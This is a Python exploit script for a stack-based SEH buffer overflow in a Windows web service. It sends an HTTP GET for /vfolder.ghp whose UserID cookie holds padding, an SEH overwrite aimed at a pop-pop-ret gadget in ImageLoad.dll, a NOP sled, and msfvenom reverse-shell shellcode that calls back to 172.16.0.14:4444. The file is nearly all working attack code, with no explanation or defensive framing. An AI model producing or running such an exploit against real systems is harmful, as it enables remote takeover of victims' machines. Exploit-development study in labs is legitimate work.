import socket
import os
import sys

ip = '127.0.0.1'
port = 80

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=172.16.0.14 -b "\x00\x0a\x0d\x0c" -f python
buf =  b""
buf += b"\xba\xcb\xac\xd3\xd5\xda\xc6\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x20\x50\x31"
buf += b"\x20\x4a\x41\x34\xcb\xb2\x92\x59\x45\x57\xa3\x59\x31"
buf += b"\x1c\x94\x69\x31\x70\x19\x01\x17\x60\xaa\x67\xb0\x87"
buf += b"\x1b\xcd\xe6\xa6\x9c\x7e\xda\xa9\x1e\x7d\x0f\x09\x1e"
buf += b"\x4e\x42\x48\x67\xb3\xaf\x18\x30\xbf\x02\x8c\x35\xf5"
buf += b"\x9e\x27\x05\x1b\xa7\xd4\xde\x1a\x86\x4b\x54\x45\x08"
buf += b"\x6a\xb9\xfd\x01\x74\xde\x38\xdb\x0f\x14\xb6\xda\xd9"
buf += b"\x64\x37\x70\x24\x49\xca\x88\x61\x6e\x35\xff\x9b\x8c"
buf += b"\xc8\xf8\x58\xee\x16\x8c\x7a\x48\xdc\x36\xa6\x68\x31"
buf += b"\xa0\x2d\x66\xfe\xa6\x69\x6b\x01\x6a\x02\x97\x8a\x8d"
buf += b"\xc4\x11\xc8\xa9\xc0\x7a\x8a\xd0\x51\x27\x7d\xec\x81"
buf += b"\x88\x22\x48\xca\x25\x36\xe1\x91\x21\xfb\xc8\x29\xb2"
buf += b"\x93\x5b\x5a\x80\x3c\xf0\xf4\xa8\xb5\xde\x03\xce\xef"
buf += b"\xa7\x9b\x31\x10\xd8\xb2\xf5\x44\x88\xac\xdc\xe4\x43"
buf += b"\x2c\xe0\x30\xc3\x7c\x4e\xeb\xa4\x2c\x2e\x5b\x4d\x26"
buf += b"\xa1\x84\x6d\x49\x6b\xad\x04\xb0\xfc\x7e\xc8\xba\xf2"
buf += b"\x16\xeb\xba\x1b\xbb\x62\x5c\x71\x53\x23\xf7\xee\xca"
buf += b"\x6e\x83\x8f\x13\xa5\xee\x90\x98\x4a\x0f\x5e\x69\x26"
buf += b"\x03\x37\x99\x7d\x79\x9e\xa6\xab\x15\x7c\x34\x30\xe5"
buf += b"\x0b\x25\xef\xb2\x5c\x9b\xe6\x56\x71\x82\x50\x44\x88"
buf += b"\x52\x9a\xcc\x57\xa7\x25\xcd\x1a\x93\x01\xdd\xe2\x1c"
buf += b"\x0e\x89\xba\x4a\xd8\x67\x7d\x25\xaa\xd1\xd7\x9a\x64"
buf += b"\xb5\xae\xd0\xb6\xc3\xae\x3c\x41\x2b\x1e\xe9\x14\x54"
buf += b"\xaf\x7d\x91\x2d\xcd\x1d\x5e\xe4\x55\x2d\x15\xa4\xfc"
buf += b"\xa6\xf0\x3d\xbd\xaa\x02\xe8\x82\xd2\x80\x18\x7b\x21"
buf += b"\x98\x69\x7e\x6d\x1e\x82\xf2\xfe\xcb\xa4\xa1\xff\xd9"

#0x1001416d : pop ebp # pop ebx # ret  | ascii {PAGE_EXECUTE_READ} [ImageLoad.dll]
#jump 6 EB06
seh = "\x6d\x41\x01\x10"
nseh = "\xeb\x06\x90\x90"

stuff = "A"*4059 + nseh + seh + "\x90"*40 + buf + "X"*900

buffer =  "GET /vfolder.ghp HTTP/1.1\r\n"
buffer += "User-Agent: Mozilla/5.0\r\n"
buffer += "Host:" + ip + ":" + "port" + "\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-us\r\n"
buffer += "Accept-Encoding: gzip, deflate\r\n"
buffer += "Referer: http://" + ip + "/\r\n"
buffer += "Cookie: SESSIONID=6771; UserID=" + stuff	+ "; PassWD=;\r\n"
buffer += "Conection: Keep-Alive\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(buffer)
s.close()